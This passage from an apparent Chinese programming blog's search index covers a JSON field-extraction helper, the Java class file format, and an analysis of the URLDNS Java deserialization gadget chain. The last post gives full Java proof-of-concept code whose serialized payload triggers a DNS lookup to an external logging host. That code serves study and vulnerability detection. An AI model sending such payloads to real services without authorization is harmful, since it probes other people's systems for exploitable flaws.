class="variable">objType</span> <span class="operator">=</span> object.getClass().toString();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;byte&quot;</span>.equals(objType) || <span class="string">&quot;short&quot;</span>.equals(objType) || <span class="string">&quot;int&quot;</span>.equals(objType) || <span class="string">&quot;long&quot;</span>.equals(objType) || <span class="string">&quot;double&quot;</span>.equals(objType) || <span class="string">&quot;float&quot;</span>.equals(objType) || <span class="string">&quot;boolean&quot;</span>.equals(objType)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="json截取"><a href="#json截取" class="headerlink" title="json截取"></a>json截取</h2><p>思想非常简单就是将对象转换成json数据，然后在去截断我们需要的属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法二：从复杂对象中获取string类型的目标属性targetProName的值</span></span><br><span class="line"><span class="comment">     * 把对象转换成json字符串，然后截取第一次出现的targetProName的值</span></span><br><span class="line"><span class="comment">     * 适用条件：同方法一</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 复杂对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetProName 目标属性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBusinessNoFromArg</span><span class="params">(Object object,String targetProName)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(object);</span><br><span class="line">    System.err.println(<span class="string">&quot;jsonString=&quot;</span> + jsonString);</span><br><span class="line">    jsonString = StringUtils.substringAfter(jsonString,<span class="string">&quot;\&quot;&quot;</span>+targetProName + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);<span class="comment">//去截断目标属性</span></span><br><span class="line">    jsonString = StringUtils.substringBefore(jsonString,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> jsonString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java字节码</title>
      <link href="/2021/11/10/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2021/11/10/Java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="Java字节码"><a href="#Java字节码" class="headerlink" title="Java字节码"></a>Java字节码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面学习已经知道<code>Java</code>文件<code>*.java</code>通过编译后会产生<code>*.class</code>文件，<code>class</code>文件有固定的二进制格式，其结构在<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">第四章：The class File Format</a>中写了详细说明。</p><p>示例文件<code>HelloWorld.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/27 16:46</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译解析流程为：<code>HelloWorld.java</code>—&gt;（经过编译）—&gt;<code>Java字节码</code>—&gt;（编译/解析）—&gt;<code>机器码</code></p><h2 id="class文件格式"><a href="#class文件格式" class="headerlink" title="class文件格式"></a>class文件格式</h2><p>class 文件的结构是固定的，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4 magic;</span><br><span class="line">    u2 minor_version;</span><br><span class="line">    u2 major_version;</span><br><span class="line">    u2 constant_pool_count;</span><br><span class="line">    cp_info constant_pool[constant_pool_count-<span class="number">1</span>];</span><br><span class="line">    u2 access_flags;</span><br><span class="line">    u2 this_class;</span><br><span class="line">    u2 super_class;</span><br><span class="line">    u2 interfaces_count;</span><br><span class="line">    u2 interfaces[interfaces_count];</span><br><span class="line">    u2 fields_count;</span><br><span class="line">    field_info fields[fields_count];</span><br><span class="line">    u2 methods_count;</span><br><span class="line">    method_info methods[methods_count];</span><br><span class="line">    u2 attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 JVM 规范中<code>u1</code>、<code>u2</code>和<code>u4</code>分别表示的是1、2、4个字节的无符号数，可以使用<code>java.io.DataInputStream</code>类中的对应方法：<code>readUnsignedByte</code>、<code>readUnsignedShort</code>、<code>readInt</code>方法读取。</p><p>除此之外，表结构可以由任意数量的可变长度的项组成，用于表示 class 中的复杂结构，如上述的：<code>cp_info</code>、<code>field_info</code>、<code>method_info</code>和<code>attribute_info</code>。</p><p><code>HelloWorld.class</code>文件十六进制内容：<br><img src="images/image-20220927165058781.png" alt="image-20220927165058781"></p><p>下面我们根据上面固定的<code>class</code>文件结构分析</p><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p><code>class</code>文件的标识符，也就是文件头，固定值为：<code>0xCAFEBABE</code></p><h3 id="Minor-Major-Version"><a href="#Minor-Major-Version" class="headerlink" title="Minor/Major_Version"></a>Minor/Major_Version</h3><p><code>class</code>文件的版本号由主版本号和副版本号组成，<code>minor_version</code>为副版本号，<code>major_version</code>为主版本号。这里<code>0x00000037</code>可以知道版本号为<code>JDK.11</code></p><p>版本对应表如下所示：</p><div class="table-container"><table><thead><tr><th>JDK版本</th><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th>发布时间</th></tr></thead><tbody><tr><td>JDK1.1</td><td>45</td><td>2D</td><td>1996-05</td></tr><tr><td>JDK1.2</td><td>46</td><td>2E</td><td>1998-12</td></tr><tr><td>JDK1.3</td><td>47</td><td>2F</td><td>2000-05</td></tr><tr><td>JDK1.4</td><td>48</td><td>30</td><td>2002-02</td></tr><tr><td>JDK1.5</td><td>49</td><td>31</td><td>2004-09</td></tr><tr><td>JDK1.6</td><td>50</td><td>32</td><td>2006-12</td></tr><tr><td>JDK1.7</td><td>51</td><td>33</td><td>2011-07</td></tr><tr><td>JDK1.8</td><td>52</td><td>34</td><td>2014-03</td></tr><tr><td>Java9</td><td>53</td><td>35</td><td>2017-09</td></tr><tr><td>Java10</td><td>54</td><td>36</td><td>2018-03</td></tr><tr><td>Java11</td><td>55</td><td>37</td><td>2018-09</td></tr><tr><td>Java12</td><td>56</td><td>38</td><td>2019-03</td></tr><tr><td>Java13</td><td>57</td><td>39</td><td>2019-09</td></tr><tr><td>Java14</td><td>58</td><td>3A</td><td>2020-03</td></tr><tr><td>Java15</td><td>59</td><td>3B</td><td>2020-09</td></tr></tbody></table></div><h3 id="constant-pool-count"><a href="#constant-pool-count" class="headerlink" title="constant_pool_count"></a>constant_pool_count</h3><p><code>constant_pool_count(常量池计数器)</code>的值等于常量池中的数量加1，注意的是<code>long</code>和<code>double</code>类型的常量池对象占用两个常量位。</p><h3 id="constant-pool"><a href="#constant-pool" class="headerlink" title="constant_pool"></a>constant_pool</h3><p><code>constant_pool(常量池)</code>是一种结构表，代表各种字符串常量、类和接口名称、字段名称以及其他在结构及其子结构中被引用的常量。</p><p>其中<code>cp_info</code>表示的是常量池对象，数据结构如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp_info &#123;</span><br><span class="line">   u1 tag;</span><br><span class="line">   u1 info[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>u1 tag;</code>表示的是常量池中的存储类型，常量池中的<code>tag</code>说明：</p><div class="table-container"><table><thead><tr><th>Constant Kind</th><th>Tag</th><th><code>class</code> file format</th><th>Java SE</th></tr></thead><tbody><tr><td><code>CONSTANT_Utf8</code></td><td>1</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Integer</code></td><td>3</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Float</code></td><td>4</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Long</code></td><td>5</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Double</code></td><td>6</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Class</code></td><td>7</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_String</code></td><td>8</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Fieldref</code></td><td>9</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Methodref</code></td><td>10</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_InterfaceMethodref</code></td><td>11</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_NameAndType</code></td><td>12</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_MethodHandle</code></td><td>15</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_MethodType</code></td><td>16</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Dynamic</code></td><td>17</td><td>55.0</td><td>11</td></tr><tr><td><code>CONSTANT_InvokeDynamic</code></td><td>18</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Module</code></td><td>19</td><td>53.0</td><td>9</td></tr><tr><td><code>CONSTANT_Package</code></td><td>20</td><td>53.0</td><td>9</td></tr></tbody></table></div><p>每一种<code>tag</code>都对应了不同的数据结构</p><h3 id="access-flags"><a href="#access-flags" class="headerlink" title="access_flags"></a>access_flags</h3><p><code>access_flags(访问标志)</code>表示的是某个类或者接口的访问权限和属性。</p><div class="table-container"><table><thead><tr><th>标志名</th><th>十六进制值</th><th>描述</th></tr></thead><tbody><tr><td>ACC_PUBLIC</td><td>0x0001</td><td>声明为public</td></tr><tr><td>ACC_FINAL</td><td>0x0010</td><td>声明为final</td></tr><tr><td>ACC_SUPER</td><td>0x0020</td><td>废弃/仅JDK1.0.2前使用</td></tr><tr><td>ACC_INTERFACE</td><td>0x0200</td><td>声明为接口</td></tr><tr><td>ACC_ABSTRACT</td><td>0x0400</td><td>声明为abstract</td></tr><tr><td>ACC_SYNTHETIC</td><td>0x1000</td><td>声明为synthetic，表示该class文件并非由Java源代码所生成</td></tr><tr><td>ACC_ANNOTATION</td><td>0x2000</td><td>标识注解类型</td></tr><tr><td>ACC_ENUM</td><td>0x4000</td><td>标识枚举类型</td></tr></tbody></table></div><p>同时这些标记可以通过或运算进行组合</p><h3 id="this-class"><a href="#this-class" class="headerlink" title="this_class"></a>this_class</h3><p><code>this_class(当前类名称)</code>表示的是当前<code>class</code>文件的类名所在常量池中的索引位置。</p><h3 id="super-class"><a href="#super-class" class="headerlink" title="super_class"></a>super_class</h3><p><code>super_class(当前类的父类名称)</code>表示的是当前<code>class</code>文件的父类类名所在常量池中的索引位置。<code>java/lang/Object</code>类的<code>super_class</code>的为0，其他任何类的<code>super_class</code>都必须是一个常量池中存在的索引位置。</p><h3 id="interfaces-count"><a href="#interfaces-count" class="headerlink" title="interfaces_count"></a>interfaces_count</h3><p><code>interfaces_count(当前类继承或实现的接口数)</code>表示的是当前类继承或实现的接口数。</p><h3 id="interfaces"><a href="#interfaces" class="headerlink" title="interfaces[]"></a>interfaces[]</h3><p><code>interfaces[interface_count](接口名称数组)</code>表示的是所有接口数组。</p><h3 id="fields-count"><a href="#fields-count" class="headerlink" title="fields_count"></a>fields_count</h3><p><code>fields_count(当前类的成员变量数)</code>表示的是当前<code>class</code>中的成员变量个数。</p><h3 id="fields"><a href="#fields" class="headerlink" title="fields[]"></a>fields[]</h3><p><code>field_info fields[fields_count](成员变量数组)</code>表示的是当前类的所有成员变量，<code>field_info</code>表示的是成员变量对象。</p><p><code>field_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">field_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员变量的修饰符；</li><li><code>u2 name_index;</code>表示的是成员变量的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员变量的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员变量的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员变量的属性信息；</li></ol><h3 id="methods-count"><a href="#methods-count" class="headerlink" title="methods_count"></a>methods_count</h3><p><code>methods_count(当前类的成员方法数)</code>表示的是当前<code>class</code>中的成员方法个数。</p><h3 id="methods"><a href="#methods" class="headerlink" title="methods[]"></a>methods[]</h3><p><code>method_info methods[methods_count](成员方法数组)</code>表示的是当前<code>class</code>中的所有成员方法，<code>method_info</code>表示的是成员方法对象</p><p><code>method_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">method_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员方法的修饰符；</li><li><code>u2 name_index;</code>表示的是成员方法的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员方法的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员方法的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员方法的属性信息；</li></ol><h3 id="attributes-count"><a href="#attributes-count" class="headerlink" title="attributes_count"></a>attributes_count</h3><p><code>attributes_count(当前类的属性数)</code>表示当前<code>class</code>文件属性表的成员个数。</p><h3 id="attributes"><a href="#attributes" class="headerlink" title="attributes[]"></a>attributes[]</h3><p><code>attribute_info attributes[attributes_count](属性数组)</code>表示的是当前<code>class</code>文件的所有属性，<code>attribute_info</code>是一个非常复杂的数据结构，存储着各种属性信息。<br><code>attribute_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">attribute_info &#123;</span><br><span class="line">   u2 attribute_name_index;</span><br><span class="line">   u4 attribute_length;</span><br><span class="line">   u1 info[attribute_length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>u2 attribute_name_index;</code>表示的是属性名称索引，读取<code>attribute_name_index</code>值所在常量池中的名称可以得到属性名称。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="images/1.jpeg" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/README/"/>
      <url>/2021/11/10/README/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍一些nodejs中的安全问题"><a href="#介绍一些nodejs中的安全问题" class="headerlink" title="介绍一些nodejs中的安全问题"></a>介绍一些nodejs中的安全问题</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URLNDS利用链分析</title>
      <link href="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS利用链分析"><a href="#URLDNS利用链分析" class="headerlink" title="URLDNS利用链分析"></a>URLDNS利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>URLDNS</code>是相对于其他利用链较为简单的一条<code>gadget</code>利用链，由于<code>URLDNS</code>不依赖与其他第三方库，且不限制<code>jdk</code>版本，所以常常用来检测程序是否存在反序列化漏洞。</p><p><code>URLDNS</code>的特点：只能发送<code>DNS</code>请求，不能执行其他任何命令。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>问题出在<code>HashMap</code>的<code>readObject()</code>方法中，我们看一下源码，在最后传进的<code>putVal()</code>方法中对<code>key</code>进行了<code>hash()</code>计算<br><img src="images/image-20220918225012617.png" alt="image-20220918225012617"></p><p>跟进<code>hash()</code>方法，接着会调用传进来的<code>key</code>的<code>hashCode()</code>的方法<br><img src="images/image-20220918231235822.png" alt="image-20220918231235822"></p><p>因为我们传进来的<code>key</code>是<code>URL</code>对象，因此接着跟进<code>URL</code>类的<code>hashCode()</code>方法，这里对<code>hackCode</code>参数的值进行了判断，需要满足等于<code>-1</code>的条件<br><img src="images/image-20220918231432956.png" alt="image-20220918231432956"></p><p>继续跟进<code>hashCode = handler.hashCode(this);</code>中的<code>hashCode()</code>方法，该方法里面调用了<code>getHostAddress()</code>方法<br><img src="images/image-20220918231623683.png" alt="image-20220918231623683"></p><p>继续跟进<code>getHostAddress()</code>方法，发现调用了<code>InetAddress.getByName(host);</code>方法<br><img src="images/image-20220918231719742.png" alt="image-20220918231719742"></p><p><code>InetAddress.getByName(host)</code>：只需要传入目标主机的名字，<code>InetAddress</code>会尝试做连接DNS服务器，并且获取IP地址的操作。</p><p>因此在此处发起了一次<code>DNS</code>请求，总结<code>URLDNS</code>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap --&gt; readObject()</span><br><span class="line">HashMap --&gt; putVal()</span><br><span class="line">HashMap --&gt; hash()</span><br><span class="line">URL     --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; getHostAddress()</span><br><span class="line">InetAddress      --&gt; InetAddress.getByName()</span><br></pre></td></tr></table></figure></p><p>构造 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c62a1767.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>成功发送了 DNS 请求<br><img src="images/image-20220918232949145.png" alt="image-20220918232949145"></p><h2 id="为什么发送了两次请求？"><a href="#为什么发送了两次请求？" class="headerlink" title="为什么发送了两次请求？"></a>为什么发送了两次请求？</h2><p>可以看到上图中的结果显示一共发送了两次请求，调试后发现<code>HashMap.put()</code>方法也会调用一次<code>putVal()</code>方法<br><img src="images/image-20220918233144243.png" alt="image-20220918233144243"></p><p>为了规避实际环境中产生误判的情况，我们需要消除掉这一次多余的<code>DNS</code>请求。</p><p>我们在<code>put()</code>方法前先设置<code>hashCode</code>字段值不为<code>-1</code>就可以不进入<code>hashCode = handler.hashCode(this);</code>语句里，就可避免发送<code>DNS</code>请求。</p><p>最终 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4b9cc854.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img 